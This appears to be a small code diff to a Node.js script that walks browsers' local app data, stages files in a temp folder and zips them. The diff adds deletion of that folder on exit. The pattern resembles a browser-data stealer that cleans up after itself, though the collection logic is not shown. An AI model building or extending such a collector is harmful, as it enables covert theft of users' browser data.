@@ -1,6 +1,6 @@
 const { paths: { localAppData } } = require('./util/variables');
 const { resolve, sep, join } = require('path');
-const { existsSync, mkdtempSync, mkdirSync} = require('fs');
+const { existsSync, mkdtempSync, mkdirSync, rmSync } = require('fs');
 const os = require('os');
 const config = require('./config');
 const tempFolder = mkdtempSync(join(os.tmpdir(), sep)).toString();
@@ -38,3 +38,5 @@ browsers.forEach((browser) => {
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 sleep(1000).then(() => require('./util/functions/zip'));
+
+process.on('beforeExit', () => rmSync(tempFolder, { recursive: true }));
